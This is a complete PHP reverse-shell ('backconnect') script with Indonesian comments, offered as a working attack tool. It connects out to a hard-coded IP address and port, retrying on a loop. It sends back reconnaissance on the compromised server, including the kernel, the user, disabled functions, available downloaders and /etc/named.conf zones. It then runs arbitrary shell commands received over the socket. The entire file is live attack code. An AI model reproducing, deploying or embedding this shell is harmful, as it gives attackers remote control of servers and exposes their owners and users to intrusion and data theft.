<?php
// Konfigurasi
 $target_ip = "103.125.43.187"; // Ganti dengan IP client Anda
 $target_port = 1323;           // Port yang Anda dengarkan di client
 $reconnect_interval = 5;       // Interval reconnect (detik)

// Fungsi untuk mendapatkan informasi sistem
function get_system_info() {
    $info = array();
    
    // Uname
    $info['uname'] = php_uname('a');
    
    // User dan Group
    $info['user'] = get_current_user();
    $info['uid'] = getmyuid();
    $info['gid'] = getmygid();
    
    // PHP dan Safe Mode
    $info['php_version'] = phpversion();
    $info['safe_mode'] = ini_get('safe_mode') ? 'ON' : 'OFF';
    
    // IP Server
    if (isset($_SERVER['SERVER_ADDR'])) {
        $info['server_ip'] = $_SERVER['SERVER_ADDR'];
    } else {
        $info['server_ip'] = gethostbyname(gethostname());
    }
    
    // DateTime
    $info['datetime'] = date('Y-m-d H:i:s');
    
    // Domains (jika ada)
    if (file_exists('/etc/named.conf')) {
        $content = file_get_contents('/etc/named.conf');
        $info['domains'] = substr_count($content, 'zone "');
    } else {
        $info['domains'] = "Cant Read [ /etc/named.conf ]";
    }
    
    // HDD
    if (function_exists('disk_free_space') && function_exists('disk_total_space')) {
        $total = disk_total_space('/');
        $free = disk_free_space('/');
        $used = $total - $free;
        $percent = round(($used / $total) * 100, 2);
        $info['hdd'] = "Total:" . formatBytes($total) . " Free:" . formatBytes($free) . " [{$percent}%]";
    } else {
        $info['hdd'] = "Unknown";
    }
    
    // Useful Commands
    $info['useful'] = "gcc cc ld make php perl python tar gzip locate";
    
    // Downloader
    $downloader = array();
    if (is_executable('/usr/bin/wget') || is_executable('/bin/wget')) {
        $downloader[] = "wget";
    }
    if (is_executable('/usr/bin/curl') || is_executable('/bin/curl')) {
        $downloader[] = "curl";
    }
    if (count($downloader) > 0) {
        $info['downloader'] = implode(' ', $downloader);
    } else {
        $info['downloader'] = "None";
    }
    
    // Disable Functions
    $disable_functions = ini_get('disable_functions');
    if (empty($disable_functions)) {
        $info['disable_functions'] = "All Functions Accessible";
    } else {
        $info['disable_functions'] = $disable_functions;
    }
    
    // PHP Modules
    $info['curl_status'] = extension_loaded('curl') ? "ON" : "OFF";
    $info['ssh2_status'] = extension_loaded('ssh2') ? "ON" : "OFF";
    $info['magic_quotes'] = get_magic_quotes_gpc() ? "ON" : "OFF";
    $info['mysql_status'] = (extension_loaded('mysqli') || extension_loaded('mysql')) ? "ON" : "OFF";
    $info['mssql_status'] = extension_loaded('mssql') ? "ON" : "OFF";
    $info['pgsql_status'] = extension_loaded('pgsql') ? "ON" : "OFF";
    $info['oracle_status'] = extension_loaded('oci8') ? "ON" : "OFF";
    $info['cgi_status'] = (strpos(php_sapi_name(), 'cgi') !== false) ? "ON" : "OFF";
    
    // Open_basedir, etc.
    $open_basedir = ini_get('open_basedir');
    if ($open_basedir === '') {
        $info['open_basedir'] = "NONE";
    } else {
        $info['open_basedir'] = $open_basedir;
    }
    
    $safe_mode_exec_dir = ini_get('safe_mode_exec_dir');
    if ($safe_mode_exec_dir === '') {
        $info['safe_mode_exec_dir'] = "NONE";
    } else {
        $info['safe_mode_exec_dir'] = $safe_mode_exec_dir;
    }
    
    $safe_mode_include_dir = ini_get('safe_mode_include_dir');
    if ($safe_mode_include_dir === '') {
        $info['safe_mode_include_dir'] = "NONE";
    } else {
        $info['safe_mode_include_dir'] = $safe_mode_include_dir;
    }
    
    // Software Web Server
    if (isset($_SERVER['SERVER_SOFTWARE'])) {
        $info['software'] = $_SERVER['SERVER_SOFTWARE'];
    } else {
        $info['software'] = "Unknown";
    }
    
    return $info;
}

// Fungsi untuk format bytes
function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// Fungsi untuk mengirim informasi dengan warna
function send_info() {
    $info = get_system_info();
    
    // Header
    $output = "\033[1;32m========================================\033[0m\n";
    $output .= "\033[1;31m      BACKCONNECT SUCCESSFUL\033[0m\n";
    $output .= "\033[1;32m========================================\033[0m\n\n";
    
    // Uname
    $output .= "\033[1;33mUname:\033[0m\t\033[1;37m{$info['uname']}\033[0m\n";
    
    // User dan Group
    $output .= "\033[1;33mUser:\033[0m\t\033[1;37m{$info['uid']} [ {$info['user']} ] Group: {$info['gid']}\033[0m\n";
    
    // PHP
    $output .= "\033[1;33mPHP:\033[0m\t\033[1;37m{$info['php_version']} Safe Mode: {$info['safe_mode']}\033[0m\n";
    
    // IP
    $output .= "\033[1;33mServerIP:\033[0m\t\033[1;37m{$info['server_ip']} Your IP: {$GLOBALS['target_ip']}\033[0m\n";
    
    // DateTime
    $output .= "\033[1;33mDateTime:\033[0m\t\033[1;37m{$info['datetime']}\033[0m\n";
    
    // Domains
    $output .= "\033[1;33mDomains:\033[0m\t\033[1;37m{$info['domains']}\033[0m\n";
    
    // HDD
    $output .= "\033[1;33mHDD:\033[0m\t\033[1;37m{$info['hdd']}\033[0m\n";
    
    // Useful
    $output .= "\033[1;33mUseful :\033[0m\t\033[1;37m{$info['useful']}\033[0m\n";
    
    // Downloader
    $output .= "\033[1;33mDownloader:\033[0m\t\033[1;37m{$info['downloader']}\033[0m\n";
    
    // Disable Functions
    $output .= "\033[1;33mDisable Functions:\033[0m\t\033[1;37m{$info['disable_functions']}\033[0m\n";
    
    // PHP Modules
    $output .= "\033[1;33mCURL :\033[0m\t\033[1;37m{$info['curl_status']} | SSH2 : {$info['ssh2_status']} | Magic Quotes : {$info['magic_quotes']} | MySQL : {$info['mysql_status']} | MSSQL : {$info['mssql_status']} | PostgreSQL : {$info['pgsql_status']} | Oracle : {$info['oracle_status']} | CGI : {$info['cgi_status']}\033[0m\n";
    
    // Open_basedir, etc.
    $output .= "\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{$info['open_basedir']} | Safe_mode_exec_dir : {$info['safe_mode_exec_dir']} | Safe_mode_include_dir : {$info['safe_mode_include_dir']}\033[0m\n";
    
    // Software
    $output .= "\033[1;33mSoftWare:\033[0m\t\033[1;37m{$info['software']}\033[0m\n";
    
    $output .= "\n";
    $output .= "\033[1;32m========================================\033[0m\n";
    $output .= "\033[1;31m      INTERACTIVE SHELL READY\033[0m\n";
    $output .= "\033[1;32m========================================\033[0m\n\n";
    
    return $output;
}

// Fungsi untuk menjalankan shell interaktif
function run_interactive_shell($socket) {
    // Dapatkan direktori kerja awal
    $cwd = getcwd();
    $prompt = "\033[1;36m{$cwd}>\033[0m ";
    fwrite($socket, $prompt);
    
    while (!feof($socket)) {
        // Baca perintah dari client
        $command = fgets($socket);
        if ($command === false) {
            break;
        }
        
        $command = trim($command);
        
        // Periksa perintah khusus
        if ($command === 'exit') {
            fwrite($socket, "\033[1;31mDisconnecting...\033[0m\n");
            break;
        } elseif ($command === '') {
            // Jika kosong, hanya tampilkan prompt lagi
            fwrite($socket, $prompt);
            continue;
        }
        
        // Ubah direktori jika perlu
        if (strpos($command, 'cd ') === 0) {
            $path = substr($command, 3);
            if (empty($path)) {
                $path = getenv('HOME');
            }
            
            if (@chdir($path)) {
                $cwd = getcwd();
                $prompt = "\033[1;36m{$cwd}>\033[0m ";
                fwrite($socket, $prompt);
            } else {
                fwrite($socket, "\033[1;31mcd: {$path}: No such directory\033[0m\n");
                fwrite($socket, $prompt);
            }
            continue;
        }
        
        // Jalankan perintah dan dapatkan output
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        
        $process = proc_open($command, $descriptorspec, $pipes, $cwd);
        
        if (is_resource($process)) {
            // Tutup stdin
            fclose($pipes[0]);
            
            // Baca stdout
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            // Baca stderr
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            
            // Tutup proses
            $return_value = proc_close($process);
            
            // Kirim output ke client
            if (!empty($output)) {
                fwrite($socket, $output);
            }
            
            if (!empty($error)) {
                fwrite($socket, "\033[1;31m{$error}\033[0m");
            }
            
            // Tampilkan prompt lagi
            fwrite($socket, $prompt);
        } else {
            fwrite($socket, "\033[1;31mFailed to execute command\033[0m\n");
            fwrite($socket, $prompt);
        }
    }
}

// Fungsi backconnect
function backconnect($target_ip, $target_port, $reconnect_interval) {
    while (true) {
        echo "[*] Mencoba koneksi ke $target_ip:$target_port...\n";
        
        // Coba koneksi dengan socket
        $socket = @fsockopen($target_ip, $target_port, $errno, $errstr, 10);
        
        if ($socket) {
            // Kirim informasi sistem
            $info = send_info();
            fwrite($socket, $info);
            
            // Jalankan shell interaktif
            run_interactive_shell($socket);
            
            fclose($socket);
            echo "[*] Koneksi ditutup!\n";
        } else {
            echo "[!] Koneksi gagal: $errstr ($errno)\n";
        }
        
        echo "[!] Reconnect dalam $reconnect_interval detik...\n";
        sleep($reconnect_interval);
    }
}

// Jalankan backconnect
backconnect($target_ip, $target_port, $reconnect_interval);
?>
